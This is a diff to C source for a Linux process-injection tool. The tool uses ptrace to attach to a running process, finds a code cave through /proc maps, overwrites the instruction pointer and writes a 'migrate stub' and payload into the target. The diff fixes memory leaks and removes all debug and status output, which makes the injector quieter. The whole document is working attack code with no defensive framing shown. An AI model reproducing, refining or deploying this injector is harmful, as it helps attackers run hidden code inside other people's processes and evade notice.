@@ -17,7 +17,6 @@ char *get_permissions_from_line(char *line) {
       if (first_space != -1 && second_space != -1 && second_space > first_space) {
           char *permissions = malloc(second_space - first_space + 1);
           if (permissions == NULL) {
-              fprintf(stderr, "Could not allocate memory. Aborting.\n");
               return NULL;
           }
           for (size_t i = first_space, j = 0; i < (size_t)second_space; i++, j++) {
@@ -38,6 +37,7 @@ long get_end_address_from_maps_line(char *line) {
       memset(address_line, 0, SIZE_OF_ADDRESS + 1);
       memcpy(address_line, start_address, SIZE_OF_ADDRESS);
       long address = strtol(address_line, (char **) NULL, 16);
+      free(address_line);
       return address;
 }
 
@@ -48,6 +48,7 @@ long get_start_address_from_maps_line(char *line) {
       memset(address_line, 0, SIZE_OF_ADDRESS + 1);
       memcpy(address_line, line, SIZE_OF_ADDRESS);
       long address = strtol(address_line, (char **) NULL, 16);
+      free(address_line);
       return address;
 }
 
@@ -81,6 +82,7 @@ unsigned long find_codecave(int pid, long start, long end, int cave_size)
   fseek(mem_handler, start, SEEK_SET);
   
   mem_data = malloc(sizeof(char)*(int)(end-start));
+  
   fread(mem_data,sizeof(char), (int)(end-start), mem_handler);
   
   fclose(mem_handler);
@@ -95,7 +97,6 @@ unsigned long find_codecave(int pid, long start, long end, int cave_size)
     }
     if(current_cave_size == cave_size)
     {
-      printf("Found code cave: %d\n", current_cave_size); 
 
       free(mem_data);
       return start + ((unsigned long)mem_byte - (unsigned long)mem_data) - cave_size;
@@ -134,15 +135,11 @@ int copy_payload(int pid, unsigned long target_addr, char * payload, int payload
   //overwrite RIP using ptrace
   ptrace(PTRACE_ATTACH, pid, NULL, NULL);
   waitpid(pid, NULL, 0);
-
-  //ptrace(PTRACE_SETOPTIONS, pid, NULL, PTRACE_O_TRACECLONE);
   
   ptrace(PTRACE_GETREGS, pid, NULL, &regs);
 
   original_rip = regs.rip;
   *restore_addr = (long)regs.rip;
-
-  printf("Original RIP: %lx\n", original_rip);
   
   regs.rip = target_addr+2;
   regs.r15 = *uuid;
@@ -194,7 +191,6 @@ int inject_migrate_stub(int pid, char * migrate_stub, size_t migrate_stub_length
 
   while(getline(&line,&len, maps_handler) != -1)
   {
-    printf("%s\n", line);
     permissions = get_permissions_from_line(line);
 
     char * permission = permissions;
@@ -208,13 +204,14 @@ int inject_migrate_stub(int pid, char * migrate_stub, size_t migrate_stub_length
     
     if(*permission == 0)
       continue;
-    
+
+    free(permissions);
+
     start_address = get_start_address_from_maps_line(line);
     end_address = get_end_address_from_maps_line(line);
 
     long code_cave_address = find_codecave(pid,start_address, end_address, migrate_stub_length);
     if(code_cave_address){
-      printf("Found code cave at: %lx\n", code_cave_address);
 
       if(copy_payload(pid, code_cave_address, migrate_stub, migrate_stub_length, restore_addr, uuid))
       {
@@ -263,42 +260,30 @@ int migrate(int pid, char * migrate_stub, size_t migrate_stub_length, char * pay
   {
 
     ptrace(PTRACE_GETREGS, pid, NULL, &regs);
-    printf("%lx\n", regs.rip);
     long target_address = regs.rax;
-    printf("%lx\n", regs.rax);
-    printf("%lx\n", target_address);
-    printf("%lx\n", restore_addr);
     
     if(!inject_payload(pid, target_address, payload, payload_length))
     {
-       //TODO: restore data 
       ptrace(PTRACE_CONT, pid, NULL, NULL);
       ptrace(PTRACE_DETACH, pid, NULL, NULL);
       return 0;
     }
 
     ptrace(PTRACE_CONT, pid, NULL, NULL);
-    printf("[+] Waiting for stuff...\n");
     wait(&status);
-    printf("[+] Done waiting...\n");
+
     if(WIFSTOPPED(status) && WSTOPSIG(status) == 5){
-      printf("[+] Restoring stuff...\n");
       restore_parent(pid, restore_addr);
       
       if(ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1){
-        printf("[-] Failed to detach..\n");
         return 0;
       }
 
-      printf("[+] Detached, done...\n");
       return 1;
     }
 
-    printf("[-] Error wait\n");
     return 0;
 
-  } else{
-    printf("[-] Error wait\n");
-  }
+  }   
   return 0;
 }
